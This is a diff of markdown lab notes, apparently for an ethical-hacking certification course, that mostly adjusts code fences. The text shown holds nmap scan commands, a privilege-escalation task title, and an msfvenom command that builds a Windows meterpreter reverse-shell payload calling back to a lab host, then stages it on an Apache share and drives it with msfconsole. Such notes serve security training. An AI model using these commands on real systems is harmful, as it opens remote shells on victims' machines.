@@ -254,7 +254,7 @@ history -c
 ```
 nmap 10.10.1.0/24
 nmap -A -sC -sV [IP]
-```
+
 ```
 **Task : Escalate Privileges by Bypassing UAC and Exploiting Sticky Keys**
 ```
@@ -264,6 +264,7 @@ Run chown -R www-data:www-data /var/www/html/share command
 
 
  msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Desktop/Windows.exe
+
  cp /home/attacker/Desktop/Windows.exe /var/www/html/share/
 service apache2 start
 msfconsole
@@ -292,9 +293,6 @@ set session 2
 exploit  
 ```
 
-```
-
----
 
 ## Módulo 07 – Malware Threats
 Los labs de este módulo son mayormente basados en GUI (crear/analizar malware con herramientas visuales, sandboxing). No se identificaron comandos CLI adicionales fuera de los ya cubiertos en Módulo 06 (msfvenom, listeners netcat).
